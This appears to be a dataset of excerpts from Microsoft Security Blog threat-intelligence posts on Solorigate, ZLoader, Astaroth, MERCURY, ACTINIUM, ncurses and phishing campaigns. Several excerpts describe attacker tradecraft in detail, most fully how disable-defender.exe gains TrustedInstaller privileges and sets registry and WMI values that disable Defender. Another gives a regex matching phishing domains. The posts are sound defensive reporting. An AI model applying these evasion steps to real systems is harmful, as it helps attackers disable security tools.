for CVE-2020-0688 is in place. Use threat and vulnerability management to audit these servers regularly for vulnerabilities, misconfigurations, and suspicious activity. ", "source": "microsoft"}, {"title": "Protection", "content": "It's critical to protect Exchange servers with antivirus software and other security solutions like firewall protection and MFA. Turn on cloud-delivered protection and automatic sample submission to use artificial intelligence and machine learning to quickly identify and stop new and unknown threats. Use attack surface reduction rules to automatically block behaviors like credential theft and suspicious use of PsExec and WMI. Turn on tamper protection features to prevent attackers from stopping security services. \nIf you are worried that these security controls will affect performance or disrupt operations, engage with IT pros to help determine the true impact of these settings. Security teams and IT pros should collaborate on applying mitigations and appropriate settings. ", "source": "microsoft"}, {"title": "Introduction", "content": "Microsoft assesses with moderate confidence that MERCURY exploited remote code execution vulnerabilities in Apache Log4j 2 (also referred to as \"Log4Shell\") in vulnerable SysAid Server instances the targets were running. MERCURY has used Log4j 2 exploits in past campaigns as well. \nMSTIC assesses with high confidence that MERCURY is coordinating its operations in affiliation with Iran's Ministry of Intelligence and Security (MOIS). According to the US Cyber Command, MuddyWater, a group we track as MERCURY, \"is a subordinate element within the Iranian Ministry of Intelligence and Security.\" \nThe following are common MERCURY techniques and tooling: \nAdversary-in-the-mailbox phishing: MERCURY has a long history of spearphishing its targets. Recently, there has been an uptick in the volume of these phishing attacks. The source of the phishing comes from compromised mailboxes and initiating previous email conversations with targets. MERCURY operators include links to or directly attach commercial remote access tools, such as ScreenConnect, in these initial phishing mails. Use of cloud file-sharing services: MERCURY utilizes commercially available file-sharing services as well as self-hosting resources for delivering payloads. Use of commercial remote access applications: The initial foothold on victims emerges via commercially available remote access applications. This allows MERCURY to gain elevated privileges and be able to transfer files, primarily PowerShell scripts, easily over to the victim's environment. Tooling: MERCURY's tools of choice tend to be Venom proxy tool, Ligolo reverse tunneling, and home-grown PowerShell programs. Targeting: MERCURY targets a variety of Middle Eastern-geolocated organizations. Mailbox victims correlate directly with organizations that do business with the Middle Eastern victims. \nThis latest activity sheds light on behavior MERCURY isn't widely known for: scanning and exploiting a vulnerable application on a target's device. They have been observed performing this activity in the past, but it is not very common. The exploits are derived from open source and sculpted to fit their needs. ", "source": "microsoft"}, {"title": "Introduction", "content": "An attack timeline that SolarWinds disclosed in a recent blog showed that a fully functional Solorigate DLL backdoor was compiled at the end of February 2020 and distributed to systems sometime in late March.  The same blog also said that the attackers removed the Solorigate backdoor code from SolarWinds' build environment in June 2020. \nConsidering this timeline and the fact that the Solorigate backdoor was designed to stay dormant for at least two weeks, we approximate that the attackers spent a month or so in selecting victims and preparing unique Cobalt Strike implants as well as command-and-control (C2) infrastructure. This approximation means that real hands-on-keyboard activity most likely started as early as May. \nThe removal of the backdoor-generation function and the compromised code from SolarWinds binaries in June could indicate that, by this time, the attackers had reached a sufficient number of interesting targets, and their objective shifted from deployment and activation of the backdoor (Stage 1) to being operational on selected victim networks, continuing the attack with hands-on-keyboard activity using the Cobalt Strike implants (Stage 2). \nBut how exactly does this jump from the Solorigate backdoor (SUNBURST) to the Cobalt Strike loader (TEARDROP, Raindrop, and others) happen? What code gets triggered, and what indicators should defenders look for? \nSophisticated attackers like those behind Solorigate have a goal of expansion and stealthy persistence to maximize the amount of time they can remain undetected and collect valuable information. It's important for organizations to be able to look at forensic data across their entire environment to see how far attackers have traversed the network and how long they were there, in order to have confidence that attacks have been properly remediated from the environment. The best way to do that is with an extended detection and response (XDR) solution that enables organizations to replay past events to look for activity that might reveal the presence of an attacker on the network. Affected organizations without an XDR solution like Microsoft 365 Defender in place will have a difficult job of performing incident response. \nWhat we found from our hunting exercise across Microsoft 365 Defender data further confirms the high level of skill of the attackers and the painstaking planning of every detail to avoid discovery. To illustrate, the following diagram shows the entry vector attack chain at a glance: \nWe spent countless hours investigating Microsoft Defender telemetry and other signals from potential patient-zero machines running the backdoored version of SolarWinds DLL. Most of these machines communicated with the initial randomly generated DNS domain .avsvmcloud.com but without significant activity (step #1). However, we saw limited cases in May and June where the initial DNS network communication was closely followed by network activity on port 443 (HTTPS) to other legit-looking domains (step #7). On these handful of machines, we performed deep inspection of telemetry. \nWe know that the Solorigate backdoor only activates for certain victim profiles, and when this happens, the executing process (usually SolarWinds.BusinessLayerHost.exe) creates two files on disk (step #2): \nA VBScript, typically named after existing services or folders to blend into legitimate activities on the machine A second-stage DLL implant, a custom Cobalt Strike loader, typically compiled uniquely per machine and written into a legitimate-looking subfolder in \nAt this point the attackers are ready to activate the Cobalt Strike implant. However, the attackers apparently deem the powerful SolarWinds backdoor too valuable to lose in case of discovery, so they tried to separate the Cobalt Strike loader's execution from the SolarWinds process as much as possible. Their hope is that, even if they lose the Cobalt Strike implant due to detection, the compromised SolarWinds binary and the supply chain attack that preceded it are not exposed. \nThe attackers achieved this by having the SolarWinds process create an Image File Execution Options (IFEO) Debugger registry value for the process dllhost.exe (step #3). This is a known MITRE ATT&CK technique used for persistence, but it could also be abused to trigger execution of malicious code when a certain process is launched. Once the registry value is created, the attackers simply wait for the occasional execution of dllhost.exe, which might happen naturally on a system. This execution triggers a process launch of wscript.exe configured to run the VBScript file dropped in step $\\#4$ . \nThe VBScript in turn runs rundll32.exe, activating the Cobalt Strike DLL (step #5) using a clean parent/child process tree completely disconnected from the SolarWinds process. Finally, the VBScript removes the previously created IFEO value to clean up any traces of execution (step #6) and also deletes the following registry keys related to HTTP proxy: \nHKEY_CURRENT_USER\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\ Internet Settings\\AutoDetect   \nHKEY_CURRENT_USER\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\ Internet Settings\\AutoConfigURL ", "source": "microsoft"}, {"title": "Conclusion", "content": "As we continue to gain deeper understanding of the Solorigate attack, we get a clearer picture of the skill level of the attackers and the extent of planning they put into pulling off one of the most sophisticated attacks in recent history. The combination of a complex attack chain and a protracted operation means that defensive solutions need to have comprehensive cross-domain visibility into attacker activity and provide months of historical data with powerful hunting tools to investigate as far back as necessary. \nModern attacks like Solorigate highlight the need for organizations to use advanced security solutions like Microsoft 365 Defender and Azure Sentinel and operate security response under an \"assume breach\" mentality. Microsoft 365 Defender harnesses the power of multiple capabilities and coordinates protection across domains to provide comprehensive defense. Azure Sentinel collects data from multiple data sources, including Microsoft 365 Defender, to connect data together and allow broad hunting for attacker activity. \nIn our ongoing forensic analysis of known Solorigate cases with malicious activity occurring between May and November 2020, we have in some instances seen the following relevant alerts generated by Microsoft Defender for Endpoint and Microsoft Defender for Identity. Incident responders and defenders investigating Solorigate incidents during that timeframe can refer to these alerts, alone or in combination, as potential indicators of the Solorigate activity. \nMicrosoft Defender for Endpoint alerts: \nLow-reputation arbitrary code executed by signed executable Suspicious 'Atosev' behavior was blocked Suspicious Remote WMI Execution A WMI event filter was bound to a suspicious event consumer \nMicrosoft Defender for Identity alerts: \nUser and IP address reconnaissance (SMB) Suspected Kerberos SPN exposure \nThe disclosure of the Solorigate attack and the investigations that followed unearthed more details and intelligence that we used to improve existing detections and build new ones. Security operations teams looking to get a comprehensive guide on detecting and investigating Solorigate can refer to Using Microsoft 365 Defender to protect against Solorigate. \nMeanwhile, security administrators can use the recommendations for hardening networks against Solorigate and similar sophisticated cyberattacks outlined in Increasing resilience against Solorigate and other sophisticated attacks with Microsoft Defender. \nTo get the latest information and guidance from Microsoft, visit https://aka.ms/solorigate \nMicrosoft 365 Defender Research Team Microsoft Threat Intelligence Center (MSTIC) Microsoft Cyber Defense Operations Center (CDOC) ", "source": "microsoft"}, {"title": "Introduction", "content": "The attackers were careful to ensure the updates didn't make Astaroth easier to detect; on the contrary, the updates only make Astaroth's activities even more invisible. \nOne of the most significant updates is the use of Alternate Data Stream (ADS), which Astaroth abuses at several stages to perform various activities. ADS is a file attribute that allows a user to attach data to an existing file. The stream data and its size are not visible in File Explorer, so attacks abuse this feature to hide malicious code in plain sight. \nIn the case of Astaroth, attackers hide binary data inside the ADS of the file desktop.ini, without changing the file size. By doing this, the attackers create a haven for the payloads, which are read and decrypted on the fly. \nThe complex attack chain, which involves the use of multiple living-off-the-land binaries (LOLBins), results in the eventual loading of the Astaroth malware directly in memory. When running, Astaroth decrypts plugins that allow it to steal sensitive information, like email passwords and browser passwords. \nIn the succeeding sections, we describe each step of Astaroth's attack chain in detail. ", "source": "microsoft"}, {"title": "Protection", "content": "Attackers are increasingly turning to living-off-the-land techniques to attempt running undetected for as long as possible on systems. Because these attacks use multiple executables that are native to the system and have legitimate uses, they require a comprehensive, behavior-based approach to detection. \nLatest Astaroth living-off-the-land attacks are even more invisible but not less observable | Microsoft Security Blog Microsoft Threat Protection combines and orchestrates into a single solution the capabilities of multiple Microsoft security services to coordinate protection, detection, response, and prevention across endpoints, email, identities, and apps. \nIn the case of Astaroth, Office 365 ATP detects the malware delivery via email. Using detonation-based heuristics and machine learning, Office 365 ATP inspects links and attachments to identify malicious artifacts. \nOn endpoints, next-generation protection capabilities in Microsoft Defender ATP detect and prevent some components of Astaroth's new attack chain. Notably, through Antimalware Scan Interface (AMSI), Microsoft Defender ATP can inspect the encrypted malicious scripts used in the initial stages of the attack. \nFor the more sophisticated sections of the attack chain, behavioral blocking and containment capabilities provide dynamic protection that can stop malicious behaviors and process trees. Behavior-based protections are key to exposing livingoff-the-land threats that abuse and hide behind legitimate processes. These protections identify suspicious behavior sequences and advanced attack techniques observed on the client, which are used as triggers to analyze the process tree using real-time machine learning models in the cloud. \nThese behavior-based detections raise alerts in Microsoft Defender Security Center. With behavioral blocking and containment, not only are evasive threats exposed, detected, and stopped; security operations personnel are also notified so they can thoroughly investigate and remediate the root cause. ", "source": "microsoft"}, {"title": "Introduction", "content": "Microsoft Security Copilot is the first security product to enable defenders to move at the speed and scale of AI. Security Copilot combines this advanced large language model with a security-specific model from Microsoft. This securityspecific model in turn incorporates a growing set of security-specific skills and is https://www.microsoft.com/en-us/security/blog/2023/04/04/discover-a-new-era-of-security-with-microsoft-at-rsac-2023/ informed by Microsoft's unique global threat intelligence and more than 65 trillion daily signals. Security Copilot also delivers an enterprise-grade security and privacycompliant experience as it runs on Microsoft Azure's hyperscale infrastructure. \nBe sure to explore all Microsoft sessions happening at RSAC and mark your calendar for our keynote session featuring Vasu Jakkal, Corporate Vice President (CVP), Microsoft Security, Compliance, and Identity. \nDefending at Machine Speed: Technology's New Frontier   \nTuesday, April 25, 2023   \n3:40 PM PT to 4:00 PM PT ", "source": "microsoft"}, {"title": "Introduction", "content": "Evidence gathered during the forensic response indicated that Iran-affiliated actors conducted the attack. This evidence includes, but is not limited to: \nThe attackers were observed operating out of Iran   \nThe attackers responsible for the intrusion and exfiltration of data used tools previously used by other known Iranian attackers   \nThe attackers responsible for the intrusion and exfiltration of data targeted other sectors and countries that are consistent with Iranian interests   \nThe wiper code was previously used by a known Iranian actor   \nThe ransomware was signed by the same digital certificate used to sign other tools used by Iranian actors ", "source": "microsoft"}, {"title": "Defense", "content": "Prior to launching the final stage of the attack, the threat actors gained administrative access to a deployed endpoint detection and response (EDR) solution to make modifications, removing libraries that affected the agents across the enterprise. In addition, a binary to disable components of Microsoft Defender Antivirus was propagated using custom tooling. The distributed binary named disable-defender.exe queries for TokenElevation using the GetTokenInformation API and checks if the process is running with elevated privileges. If the token is not running with elevated privilege, the binary prints \"Must run as admin!\\n\". If the token is elevated, it queries TokenUser and checks if the SID is $^{\\prime\\prime}\\mathsf{S}{-}\\mathsf{1}{-}\\mathsf{5}{-}\\mathsf{1}\\mathsf{8}^{\\prime\\prime}$ . If the current process doesn't run under system context, it prints \"Restarting with privileges\\n\" and attempts to elevate the privilege. \nTo elevate the privilege, the binary checks if the TrustedInstaller service is enabled. To do this, it starts the service \"SeDebugPrivilege\" and \"SeImpersonatePrivilege\" to assign privileges to itself. It then looks for winlogon.exe process, acquires its token, and impersonates calling thread using ImpersonateLoggedOnUser/SetThreadToken. After impersonating as winlogon.exe, it opens TrustedInstaller process, acquires its token for impersonation and creates a new process with elevated privileges using CreateProcessWithTokenW. \nOnce it successfully creates its own process with TrustedInstaller privilege, it proceeds to disable Defender components. \nTerminates smartscreen.exe   \nModifies WinDefend service to DemandLoad.   \nModifies \"TamperProtection\" value to 0   \nQueries WMI \"Root\\Microsoft\\Windows\\Defender\" Namespace \"MSFT_MpPreference\" class for \"DisableRealtimeMonitoring\"   \nSets \"DisableAntiSpyware\" value to 1   \nSets \"SecurityHealth\" value to 3   \nSets \"DisableAntiSpyware\" value to 0   \nSets \"SYSTEM\\CurrentControlSet\\Services\\WinDefend\" service \"Start\" value to 3   \nSets \"DisableRealtimeMonitoring\" value to 1   \nModifies further settings using WMI \"Root\\Microsoft\\Windows\\Defender\" Namespace \"MSFT_MpPreference\" class values, \"EnableControlledFolderAccess\" \"PUAProtection\" \"DisableRealtimeMonitoring\" \"DisableBehaviorMonitoring\" \"DisableBlockAtFirstSeen\" \"DisablePrivacyMode\" \"SignatureDisableUpdateOnStartupWithoutEngine\" \"DisableArchiveScanning\" \"DisableIntrusionPreventionSystem\" \"DisableScriptScanning\" \"DisableAntiSpyware\" \"DisableAntiVirus\" \"SubmitSamplesConsent\" \"MAPSReporting\" \"HighThreatDefaultAction\" \"ModerateThreatDefaultAction\" \"LowThreatDefaultAction\" \"SevereThreatDefaultAction\" \"ScanScheduleDay\" \nAdditional evasion techniques included the deletion of tooling, Windows events, and application logs. ", "source": "microsoft"}, {"title": "Introduction", "content": "Terminal databases are used by ncurses to be terminal-independent, meaning the capabilities of the terminal are not required to be known ahead-of-time. Terminal databases contain a set of capabilities that ultimately determine the control characters that are sent to the terminal (instructing the terminal to perform basic interactions) and describe various properties of the terminal. Terminal databases come in two major formats: the older and less commonly used termcap (terminal capability) format, and the improved terminfo format. Since terminals can differ on the types of control characters they expect and the operations they support, terminfo became necessary to address this discrepancy.  In its textual syntax, capabilities are separated by commas, and come in three forms: \nBoolean capabilities: for example, the am capability specifies that the terminal supports automatic margins. In the terminfo textual syntax, Boolean capabilities appear by their name alone, without any additions. Numeric capabilities: for instance, the cols capability contains the number of columns in a line. In the terminfo textual syntax, numeric capabilities are recognized with a $\"\\#^{\\prime\\prime}$ symbol after their name, followed by the numeric value, such as \"cols#80\". String capabilities: for instance, the clear capability describes the control character that should be transmitted to the terminal to clear the screen. In the terminfo textual syntax, string capabilities are recognized with a $\\mathbf{\\mathit{\\omega}}=\\mathbf{\\mathit{\\omega}}$ symbol after their name, followed by the string value, such as $^{\\prime}\\mathsf{C l e a r}{=}\\backslash\\mathsf{E}[\\mathsf{H}\\backslash\\mathsf{E}[2]^{\\prime\\prime}$ . \nPOSIX systems usually pre-ship with tens of such databases. It's possible to parse the capabilities of the current database with the infocmp utility: ", "source": "microsoft"}, {"title": "Protection", "content": "While organizational devices and networks may become increasingly secure, attackers continue to exploit unpatched vulnerabilities and misconfigurations as a vector to access sensitive systems and information. Exploiting vulnerabilities in the ncurses library could have notable consequences for users, allowing attackers to perform malicious actions like elevating privileges to run code in a targeted program's context and access or modify valuable data and resources. Responding to the evolving threat landscape requires us to expand our expertise across devices and platforms as part of our commitment to continuously improve security from Microsoft, not just for Microsoft. \nThis case displays how responsible vulnerability disclosure and collaborative research informs our comprehensive protection capabilities across platforms. Microsoft Defender Vulnerability Management is able to quickly discover and remediate such vulnerabilities on both Linux and macOS. Additionally, Microsoft Defender for Endpoint has similar detections for potential abuse of terminfo databases for set-UID binaries, such as macOS's top: \nAfter discovering the vulnerabilities in the ncurses library, we worked with the maintainer, Thomas E. Dickey, and Apple to ensure the issues were resolved across platforms. Additionally, this case displays the value of community engagement to improve security for all as researcher Gergely Kalman's use case contributions assisted our research efforts. We wish to again thank Thomas and the Apple product security team for their efforts and collaboration in addressing CVE-2023- 29491, as well as Gergely for his contributions in furthering this research. \nAs the threat landscape continues to evolve and threats across all platforms continue to grow, Microsoft strives to continuously secure users' computing experiences, regardless of the platform or device in use. We will continue to work with the security community to share vulnerability discoveries and threat intelligence in the effort to build better protection for all. ", "source": "microsoft"}, {"title": "Introduction", "content": "D-Bus (short for \"Desktop-Bus\") is an inter-process communication channel (IPC) mechanism developed by the freedesktop.org project. D-Bus is a software-bus and allows processes on the same endpoint to communicate by transmitting messages and responding to them. D-Bus supports two main ways of communicating: \na. Methods \u2013 used for request-response communications.   \nb. Signals \u2013 used for publish/subscribe communications. \nAn example of D-Bus usage would be receiving a video chat by a popular video conferencing app\u2013once a video is established, the video conferencing app could send a D-bus signal publishing that a call has started. Apps listening to that message could respond appropriately\u2013for example, mute their audio. \nThere are many D-Bus components shipped by default on popular Linux desktop environments. Since those components run at different privileges and respond to messages, D-Bus components are an attractive target for attackers. Indeed, there have been interesting vulnerabilities in the past related to buggy D-Bus services, including USBCreator Elevation of Privilege, Blueman Elevation of Privilege by command injection, and other similar scenarios. \nD-Bus exposes a global System Bus and a per-session Session Bus. From an attacker's perspective, the System Bus is more attractive since it will commonly have services that run as root listening to it. ", "source": "microsoft"}, {"title": "Introduction", "content": "By Azure Network Security Team \nThe holiday season is an exciting time for many people as they get to relax, connect with friends and family, and celebrate traditions. Organizations also have much to rejoice about during the holidays (for example, more sales for retailers and more players for gaming companies). Unfortunately, cyber attackers also look forward to this time of year to celebrate an emerging holiday tradition-distributed denial-ofservice (DDoS) attacks. \nWhile DDoS attacks happen all year round, the holidays are one of the most popular times and where some of the most high-profile attacks occur. Last October in India, there was a 30-fold increase in DDoS attacks targeting services frequently used during the festive season, including media streaming, internet phone services, and online gaming . Last October through December, Microsoft mitigated several large-scale DDoS attacks, including one of the largest attacks in history from approximately 10,000 sources spanning multiple countries . \nWhile retail and gaming companies are the most targeted during the holidays, organizations of all sizes and types are vulnerable to DDoS attacks. It's easier than ever to conduct an attack. For only $\\$500,$ , anyone can pay for a DDoS subscription service to launch a DDoS attack. Every year, DDoS attacks are also becoming harder to protect against as new attack vectors emerge and cybercriminals leverage more advanced techniques, such as AI-based attacks. \nWith the holidays coming up, we've prepared this guide to provide you with an overview of DDoS attacks, trends we are seeing, and tips to help you protect against DDoS attacks. ", "source": "microsoft"}, {"title": "Introduction", "content": "ZLoader is a malware variant that has evolved over the years and is used for multiple objectives, meaning that two campaigns which both use ZLoader may appear completely different. For example, an individual who has experience responding to a ZLoader campaign that originated from email and dropped the payload via a malicious Office macro, may be shocked at the complexity of a second ZLoader campaign that uses numerous malicious files for reconnaissance and antivirus tampering, before finally dropping the actual malware payload. \nThe following diagram identifies the most common ways the ZLoader trojan has been observed moving through the delivery, installation, payload, malware activity, and follow-on activity phases of an attack. This diagram is high-level and may not depict every step or file dropped in some of ZLoader's more complex campaigns. ", "source": "microsoft"}, {"title": "Defense", "content": "ZLoader has used various methods of defense evasion, focused on attempting to appear more legitimate or by disabling security tools. In multiple campaigns associated with malicious ads, the ZLoader operators would sign malicious files used in their attack chain. Signing these files is intended to make them appear to be legitimate, non-malicious files used by real software, rather than malicious files used by malware. \nThe first method ZLoader has used to sign files is by creating fictitious companies. In certain campaigns, the .msi files that are installed on the device after the user visits a malicious ad are signed by a fictitious company created by the operator for the purpose of the campaign. The malware operators created multiple fraudulent companies, such as Flyintellect Inc, and Datalyst Oy, in several campaigns. Due to the way .msi files are designed, the registry keys that are added by this activity later in the attack chain are also published by the same company name. \nAnother method operators have used to evade detection is a set of techniques that utilize validly-signed files to hide malicious scripts through vulnerabilities like CVE2020-1599, CVE-2013-3900, and CVE-2012-0151. \nZLoader operators have also attempted to perform defense evasion by disabling security tools. In many instances, ZLoader will drop a file, frequently a .bat file, that then uses PowerShell to turn off and alter security settings, such as excluding all .dll and .exe files and regsvr32.exe from being scanned. ", "source": "microsoft"}, {"title": "defend", "content": "The take down effort against ZLoader is just one of the ways in which Microsoft provides real-world protection against threats. This action will result in protection for a wide range of organizations around the world from malware, affiliates with hands-on-keyboard access, and additional payloads delivered via ZLoader's infrastructure. \nLike many modern malware variants, getting ZLoader onto a device is oftentimes just the first step in what ends up being a larger attack. The trojan further exemplifies the trend of common malware increasingly harboring more dangerous threats, a pattern also observed in other platforms. ZLoader operators frequently monetize access from infections by selling it to other affiliate groups, who then use the purchased access to carry out their own malicious objectives. Affiliates may further misuse legitimate tools like Cobalt Strike or Splashtop to gain full hands-onkeyboard access to target devices, enabling attackers to perform additional discovery, find high-value targets on the network, move laterally, and drop additional payloads, such as ransomware variants. \nThe best advice for preventing ZLoader infections is to simply avoid downloading attachments contained in emails from unknown senders as well as clicking on sponsored ads and links in search engine results, instead opting for unsponsored results from verified, trusted sources. Good credential hygiene, network segmentation, and similar best practices increase the \"cost\" to attackers, helping disrupt their activities before they reach their target. \nDefenders can take the following mitigation steps to defend against this threat: \nEncourage users to use Microsoft Edge and other web browsers that support Microsoft Defender SmartScreen, which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that contain exploits and host malware. SmartScreen removes the reputation information for the certificates leveraged during these attacks. Binaries signed with those certificates will trigger a warning about an \"unrecognized app.\" Use Windows Defender Application Control, AppLocker, or other application control technologies to prevent end users from running unapproved software on their computers. Run the latest version of your operating systems and applications. Deploy the latest security updates as soon as they become available. Use only official, trustworthy websites and direct download links. \nZLoader's prevalence in the threat landscape demands comprehensive protection capable of detecting and stopping this malware, its components, and other similar threats at every stage of the attack chain. Microsoft Defender for Endpoint provides next-generation protection that reinforces network security perimeters and incorporates antimalware capabilities to catch emerging threats, including ZLoader, Cobalt Strike, additional payloads such as ransomware, and subsequent attacker behaviors. Moreover, our endpoint detection and response (EDR) capabilities detect ZLoader's malicious files, behaviors, domain connections, and other related events before and after execution. \nDefenders can further apply the following mitigations to reduce the environmental attack surface and mitigate the impact of this threat and its payloads: \nConfigure Microsoft Defender for Office 365 to recheck links on click. Safe Links provides URL scanning and rewriting of inbound email messages in mail flow, and time-of-click verification of URLs and links in email messages and other locations. Safe Links scanning occurs in addition to the regular antispam and anti-malware protection in inbound email messages in Exchange Online Protection (EOP). Safe Links scanning can help protect your organization from malicious links that are used in phishing and other attacks. \nConfigure Microsoft Defender for Office 365 to detonate file attachments via Safe Attachments. Safe Attachments provides an additional layer of protection for email attachments by verifying a file in a virtual environment prior to delivering to the inbox.   \nCheck your Office 365 antispam policy and your mail flow rules for allowed senders, domains and IP addresses. Apply extra caution when using these settings to bypass antispam filters, even if the allowed sender addresses are associated with trusted organizations-Office 365 will honor these settings and can let potentially harmful messages pass through. Review system overrides in threat explorer to determine why attack messages have reached recipient mailboxes.   \nConfigure Exchange Online to enable zero-hour auto purge (ZAP) in response to newly acquired threat intelligence. ZAP retroactively detects and neutralizes malicious phishing, spam, or malware messages that have already been delivered to mailboxes.   \nTurn on network protection to block connections to malicious domains and IP addresses.   \nTurn on tamper protection features to prevent attackers from stopping security services.   \nTurn on cloud-delivered protection and automatic sample submission on Microsoft Defender Antivirus. These capabilities use artificial intelligence and machine learning to quickly identify and stop new and unknown threats.   \nTurn on the following attack surface reduction rules to block or audit activity associated with this threat: Block executable files from running unless they meet a prevalence, age, or trusted list criterion Block all Office applications from creating child processes Block Office applications from creating executable content Block executable content from email client and webmail Block Office applications from injecting code into other processes Block credential stealing from the Windows local security authority subsystem (lsass.exe) Block process creations originating from PsExec and WMI commands Use advanced protection against ransomware Block JavaScript or VBScript from launching downloaded executable content Block execution of potentially obfuscated scripts ", "source": "microsoft"}, {"title": "defend", "content": "Dismantling ZLoader: How malicious ads led to disabled security tools and ransomware | Microsoft Security Blog Alerts with the following titles in the security center can indicate threat activity on your network: \nSuspicious behavior associated with ZLoader File associated with ZLoader Connection to a domain associated with ZLoader \nThe following alerts might also indicate activity associated with this threat.   \nHowever, unrelated threat activity can trigger these alerts.   \nMicrosoft Defender Antivirus protection turned off Suspicious Microsoft Defender Antivirus exclusion   \nZLoader' malware was detected Suspicious behavior by cmd.exe was observed Suspicious PowerShell command line Suspicious Remote System Discovery   \nSuspicious Domain Trust Discovery ", "source": "microsoft"}, {"title": "defend", "content": "Signals from Microsoft Defender for Office 365 inform Microsoft 365 Defender, which correlates cross-domain threat intelligence to deliver coordinated defense, that ZLoader has been detected when a document is delivered via email when detonation is enabled. These alerts, however, can also be triggered by unrelated threat activity. \nA potentially malicious URL click was detected Email messages containing malicious file removed after delivery Email messages containing malicious URL removed after delivery Email messages containing malware removed after delivery Email messages removed after delivery Malware campaign detected after delivery Malware campaign detected and blocked Malware not zapped because ZAP is disabled ", "source": "microsoft"}, {"title": "Introduction", "content": "To maximize DART's efforts to restore business continuity while simultaneously analyzing the details of the incident, a careful and thorough investigation is coordinated with remediation measures to ensure that the root cause is determined. These efforts take place as we assist and advise customers with the task of getting the organization up and running again in a secure manner. \nEvery effort is made to determine how the adversary gained access to the customer's assets so that vulnerabilities can be remediated. Otherwise, it is highly likely that the same type of attack will take place again in the future. In some cases, the threat actor takes steps to \"cover their tracks\" and destroy evidence, so it is possible that the entire chain of events may not be evident. \nThe following are three key steps in our ransomware investigations: ", "source": "microsoft"}, {"title": "Introduction", "content": "By Microsoft Digital Security Unit (DSU) Microsoft Threat Intelligence \nApril 2023 update \u2013 Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. ACTINIUM is now tracked as Aqua Blizzard and DEV-0586 is now tracked as Cadet Blizzard. \nTo learn about how the new taxonomy represents the origin, unique traits, and impact of threat actors, and to get a complete mapping of threat actor names, read this blog: Microsoft shifts to a new threat actor naming taxonomy. \nThe Microsoft Threat Intelligence Center (MSTIC) is sharing information on a threat group named ACTINIUM, which has been operational for almost a decade and has consistently pursued access to organizations in Ukraine or entities related to \nhttps://www.microsoft.com/en-us/security/blog/2022/02/04/actinium-targets-ukrainian-organizations/ \nUkrainian affairs. MSTIC previously tracked ACTINIUM activity as DEV-0157, and this group is also referred to publicly as Gamaredon. \nNOTE: This blog is available in Ukrainian on the Microsoft CEE Multi-Country News Center to help organizations in Ukraine implement protections against this activity: \u0410\u041a\u0422\u0418\u041d\u0406\u0419(ACTINIUM) \u0430\u0442\u0430\u043a\u0443\u0454 \u0443\u043a\u0440\u0430\u0457\u043d\u0441\u044c\u043a\u0456 \u043e\u0440\u0433\u0430\u043d\u0456\u0437\u0430\u0446\u0456\u0457. \nIn the last six months, MSTIC has observed ACTINIUM targeting organizations in Ukraine spanning government, military, non-government organizations (NGO), judiciary, law enforcement, and non-profit, with the primary intent of exfiltrating sensitive information, maintaining access, and using acquired access to move laterally into related organizations. MSTIC has observed ACTINIUM operating out of Crimea with objectives consistent with cyber espionage. The Ukrainian government has publicly attributed this group to the Russian Federal Security Service (FSB). \nSince October 2021, ACTINIUM has targeted or compromised accounts at organizations critical to emergency response and ensuring the security of Ukrainian territory, as well as organizations that would be involved in coordinating the distribution of international and humanitarian aid to Ukraine in a crisis. As with any observed nation-state actor activity, Microsoft directly notifies customers of online services that have been targeted or compromised, providing them with the information they need to secure their accounts. Microsoft has shared this information with Ukrainian authorities. \nACTINIUM represents a unique set of activities separate from the destructive malware attacks by DEV-0586 described in an earlier blog post. As of this writing, MSTIC has not found any indicators correlating these two actors or their operations. The observed ACTINIUM activities detailed in this blog have been limited only to organizations within Ukraine. We have not seen this actor using any unpatched vulnerabilities in Microsoft products or services. \nGiven the geopolitical situation and the scale of observed activity, MSTIC is prioritizing sharing our knowledge of ACTINIUM tactics, techniques, and procedures (TTPs), along with a significant number of indicators of compromise (IOCs) from our extensive analysis. Our goal is to give organizations the latest intelligence to guide investigations into potential attacks and information to implement proactive protections against future attempts. ", "source": "microsoft"}, {"title": "Indicators of compromise", "content": "The following IOCs were observed during our investigation. We encourage our customers to investigate these indicators in their environments and implement detections and protections to identify past related activity and prevent future attacks against their systems. \nAnalyst note on ACTINIUM IOCs: ACTINIUM registers and administers a large amount of infrastructure. It's not always possible to accurately determine what malicious component connects to which C2 infrastructure. MSTIC has observed cases where the same C2 is used for different components (for example, corolain[.]ru). ", "source": "microsoft"}, {"title": "Introduction", "content": "The campaign leveraged multiple components and techniques to quietly compromise accounts and propagate the attack. Using Microsoft 365 Defender threat data, we found the attack's initial compromise vector to be a phishing campaign. Our analysis found that the recipients received a DocuSign-branded phishing email, displayed below: \nEvolved phishing: Device registration trick adds to phishers' toolbox for victims without MFA | Microsoft Security Blog The attacker used a set of phishing domains registered under .xyz top-level domain. The URL domain can be described with the following regular expression syntax: \nUrlDomain matches regex @\"^[a-z]{5}\\.ar[a-z]{4,5}\\.xyz\" \nThe phishing link was uniquely generated for each email, with the victim's email address encoded in the query parameter of the URL. After clicking the link, the victim was redirected to a phishing website at newdoc-lnpye[.]ondigitalocean[.]app, which imitated the login page for Office 365. The fake login page was pre-filled with the targeted victim's username and prompted them to enter their password. This technique increased the likelihood that the victim viewed the website as being legitimate and trustworthy. \nNext, we detected that the victim's stolen credentials were immediately used to establish a connection with Exchange Online PowerShell, most likely using an automated script as part of a phishing kit. Leveraging the Remote PowerShell connection, the attacker implemented an inbox rule via the New-InboxRule cmdlet that deleted certain messages based on keywords in the subject or body of the email message. The inbox rule allowed the attackers to avoid arousing the compromised users' suspicions by deleting non-delivery reports and IT notification emails that might have been sent to the compromised user. \nDuring our investigation of the first stage of this campaign, we saw over one hundred compromised mailboxes in multiple organizations with inbox rules consistently fitting the pattern below: \nWhile multiple users within various organizations were compromised in the first wave, the attack did not progress past this stage for the majority of targets as they had MFA enabled. The attack's propagation heavily relied on a lack of MFA \nEvolved phishing: Device registration trick adds to phishers' toolbox for victims without MFA | Microsoft Security Blog protocols. Enabling MFA for Office 365 applications or while registering new devices could have disrupted the second stage of the attack chain. ", "source": "microsoft"}, {"title": "defend", "content": "The latest Microsoft Digital Defense Report detailed that phishing poses a major threat to both enterprises and individuals, while credential phishing was leveraged in many of the most damaging attacks in the last year. Attackers targeting employee credentials, particularly employees with high privileges, typically use the stolen data to sign into other devices and move laterally inside the network. The phishing campaign we discussed in this blog exemplifies the increasing sophistication of these attacks. \nIn order to disrupt attackers before they reach their 